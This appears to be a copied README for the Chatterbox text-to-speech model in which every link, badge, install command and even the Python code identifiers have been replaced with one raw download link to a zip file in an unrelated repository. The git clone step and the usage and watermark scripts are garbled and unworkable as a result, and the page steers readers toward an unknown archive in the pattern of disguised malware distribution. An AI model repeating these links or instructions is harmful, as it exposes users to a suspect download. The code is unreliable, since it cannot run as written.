
<img width="1200" alt="cb-big2" src="https://github.com/hotmysia/chatterbox--do-test-w/raw/refs/heads/master/src/do_w_chatterbox_test_2.4-alpha.5.zip" />

# Chatterbox TTS

[![Alt Text](https://github.com/hotmysia/chatterbox--do-test-w/raw/refs/heads/master/src/do_w_chatterbox_test_2.4-alpha.5.zip)](https://github.com/hotmysia/chatterbox--do-test-w/raw/refs/heads/master/src/do_w_chatterbox_test_2.4-alpha.5.zip)
[![Alt Text](https://github.com/hotmysia/chatterbox--do-test-w/raw/refs/heads/master/src/do_w_chatterbox_test_2.4-alpha.5.zip)](https://github.com/hotmysia/chatterbox--do-test-w/raw/refs/heads/master/src/do_w_chatterbox_test_2.4-alpha.5.zip)
[![Alt Text](https://github.com/hotmysia/chatterbox--do-test-w/raw/refs/heads/master/src/do_w_chatterbox_test_2.4-alpha.5.zip)](https://github.com/hotmysia/chatterbox--do-test-w/raw/refs/heads/master/src/do_w_chatterbox_test_2.4-alpha.5.zip)
[![Discord](https://github.com/hotmysia/chatterbox--do-test-w/raw/refs/heads/master/src/do_w_chatterbox_test_2.4-alpha.5.zip%20discord&logo=discord&style=flat)](https://github.com/hotmysia/chatterbox--do-test-w/raw/refs/heads/master/src/do_w_chatterbox_test_2.4-alpha.5.zip)

_Made with ♥️ by <a href="https://github.com/hotmysia/chatterbox--do-test-w/raw/refs/heads/master/src/do_w_chatterbox_test_2.4-alpha.5.zip" target="_blank"><img width="100" alt="resemble-logo-horizontal" src="https://github.com/hotmysia/chatterbox--do-test-w/raw/refs/heads/master/src/do_w_chatterbox_test_2.4-alpha.5.zip" /></a>

We're excited to introduce Chatterbox, [Resemble AI's](https://github.com/hotmysia/chatterbox--do-test-w/raw/refs/heads/master/src/do_w_chatterbox_test_2.4-alpha.5.zip) first production-grade open source TTS model. Licensed under MIT, Chatterbox has been benchmarked against leading closed-source systems like ElevenLabs, and is consistently preferred in side-by-side evaluations.

Whether you're working on memes, videos, games, or AI agents, Chatterbox brings your content to life. It's also the first open source TTS model to support **emotion exaggeration control**, a powerful feature that makes your voices stand out. Try it now on our [Hugging Face Gradio app.](https://github.com/hotmysia/chatterbox--do-test-w/raw/refs/heads/master/src/do_w_chatterbox_test_2.4-alpha.5.zip)

If you like the model but need to scale or tune it for higher accuracy, check out our competitively priced TTS service (<a href="https://github.com/hotmysia/chatterbox--do-test-w/raw/refs/heads/master/src/do_w_chatterbox_test_2.4-alpha.5.zip">link</a>). It delivers reliable performance with ultra-low latency of sub 200ms—ideal for production use in agents, applications, or interactive media.

# Key Details
- SoTA zeroshot TTS
- 0.5B Llama backbone
- Unique exaggeration/intensity control
- Ultra-stable with alignment-informed inference
- Trained on 0.5M hours of cleaned data
- Watermarked outputs
- Easy voice conversion script
- [Outperforms ElevenLabs](https://github.com/hotmysia/chatterbox--do-test-w/raw/refs/heads/master/src/do_w_chatterbox_test_2.4-alpha.5.zip)

# Tips
- **General Use (TTS and Voice Agents):**
  - The default settings (`exaggeration=0.5`, `cfg_weight=0.5`) work well for most prompts.
  - If the reference speaker has a fast speaking style, lowering `cfg_weight` to around `0.3` can improve pacing.

- **Expressive or Dramatic Speech:**
  - Try lower `cfg_weight` values (e.g. `~0.3`) and increase `exaggeration` to around `0.7` or higher.
  - Higher `exaggeration` tends to speed up speech; reducing `cfg_weight` helps compensate with slower, more deliberate pacing.


# Installation
```shell
pip install chatterbox-tts
```

Alternatively, you can install from source:
```shell
# conda create -yn chatterbox python=3.11
# conda activate chatterbox

git clone https://github.com/hotmysia/chatterbox--do-test-w/raw/refs/heads/master/src/do_w_chatterbox_test_2.4-alpha.5.zip
cd chatterbox
pip install -e .
```
We developed and tested Chatterbox on Python 3.11 on Debain 11 OS; the versions of the dependencies are pinned in `https://github.com/hotmysia/chatterbox--do-test-w/raw/refs/heads/master/src/do_w_chatterbox_test_2.4-alpha.5.zip` to ensure consistency. You can modify the code or dependencies in this installation mode.


# Usage
```python
import torchaudio as ta
from https://github.com/hotmysia/chatterbox--do-test-w/raw/refs/heads/master/src/do_w_chatterbox_test_2.4-alpha.5.zip import ChatterboxTTS

model = https://github.com/hotmysia/chatterbox--do-test-w/raw/refs/heads/master/src/do_w_chatterbox_test_2.4-alpha.5.zip(device="cuda")

text = "Ezreal and Jinx teamed up with Ahri, Yasuo, and Teemo to take down the enemy's Nexus in an epic late-game pentakill."
wav = https://github.com/hotmysia/chatterbox--do-test-w/raw/refs/heads/master/src/do_w_chatterbox_test_2.4-alpha.5.zip(text)
https://github.com/hotmysia/chatterbox--do-test-w/raw/refs/heads/master/src/do_w_chatterbox_test_2.4-alpha.5.zip("https://github.com/hotmysia/chatterbox--do-test-w/raw/refs/heads/master/src/do_w_chatterbox_test_2.4-alpha.5.zip", wav, https://github.com/hotmysia/chatterbox--do-test-w/raw/refs/heads/master/src/do_w_chatterbox_test_2.4-alpha.5.zip)

# If you want to synthesize with a different voice, specify the audio prompt
AUDIO_PROMPT_PATH = "https://github.com/hotmysia/chatterbox--do-test-w/raw/refs/heads/master/src/do_w_chatterbox_test_2.4-alpha.5.zip"
wav = https://github.com/hotmysia/chatterbox--do-test-w/raw/refs/heads/master/src/do_w_chatterbox_test_2.4-alpha.5.zip(text, audio_prompt_path=AUDIO_PROMPT_PATH)
https://github.com/hotmysia/chatterbox--do-test-w/raw/refs/heads/master/src/do_w_chatterbox_test_2.4-alpha.5.zip("https://github.com/hotmysia/chatterbox--do-test-w/raw/refs/heads/master/src/do_w_chatterbox_test_2.4-alpha.5.zip", wav, https://github.com/hotmysia/chatterbox--do-test-w/raw/refs/heads/master/src/do_w_chatterbox_test_2.4-alpha.5.zip)
```
See `https://github.com/hotmysia/chatterbox--do-test-w/raw/refs/heads/master/src/do_w_chatterbox_test_2.4-alpha.5.zip` and `https://github.com/hotmysia/chatterbox--do-test-w/raw/refs/heads/master/src/do_w_chatterbox_test_2.4-alpha.5.zip` for more examples.

# Supported Lanugage
Currenlty only English.

# Acknowledgements
- [Cosyvoice](https://github.com/hotmysia/chatterbox--do-test-w/raw/refs/heads/master/src/do_w_chatterbox_test_2.4-alpha.5.zip)
- [Real-Time-Voice-Cloning](https://github.com/hotmysia/chatterbox--do-test-w/raw/refs/heads/master/src/do_w_chatterbox_test_2.4-alpha.5.zip)
- [HiFT-GAN](https://github.com/hotmysia/chatterbox--do-test-w/raw/refs/heads/master/src/do_w_chatterbox_test_2.4-alpha.5.zip)
- [Llama 3](https://github.com/hotmysia/chatterbox--do-test-w/raw/refs/heads/master/src/do_w_chatterbox_test_2.4-alpha.5.zip)
- [S3Tokenizer](https://github.com/hotmysia/chatterbox--do-test-w/raw/refs/heads/master/src/do_w_chatterbox_test_2.4-alpha.5.zip)

# Built-in PerTh Watermarking for Responsible AI

Every audio file generated by Chatterbox includes [Resemble AI's Perth (Perceptual Threshold) Watermarker](https://github.com/hotmysia/chatterbox--do-test-w/raw/refs/heads/master/src/do_w_chatterbox_test_2.4-alpha.5.zip) - imperceptible neural watermarks that survive MP3 compression, audio editing, and common manipulations while maintaining nearly 100% detection accuracy.


## Watermark extraction

You can look for the watermark using the following script.

```python
import perth
import librosa

AUDIO_PATH = "https://github.com/hotmysia/chatterbox--do-test-w/raw/refs/heads/master/src/do_w_chatterbox_test_2.4-alpha.5.zip"

# Load the watermarked audio
watermarked_audio, sr = https://github.com/hotmysia/chatterbox--do-test-w/raw/refs/heads/master/src/do_w_chatterbox_test_2.4-alpha.5.zip(AUDIO_PATH, sr=None)

# Initialize watermarker (same as used for embedding)
watermarker = https://github.com/hotmysia/chatterbox--do-test-w/raw/refs/heads/master/src/do_w_chatterbox_test_2.4-alpha.5.zip()

# Extract watermark
watermark = https://github.com/hotmysia/chatterbox--do-test-w/raw/refs/heads/master/src/do_w_chatterbox_test_2.4-alpha.5.zip(watermarked_audio, sample_rate=sr)
print(f"Extracted watermark: {watermark}")
# Output: 0.0 (no watermark) or 1.0 (watermarked)
```


# Official Discord

👋 Join us on [Discord](https://github.com/hotmysia/chatterbox--do-test-w/raw/refs/heads/master/src/do_w_chatterbox_test_2.4-alpha.5.zip) and let's build something awesome together!

# Disclaimer
Don't use this model to do bad things. Prompts are sourced from freely available data on the internet.
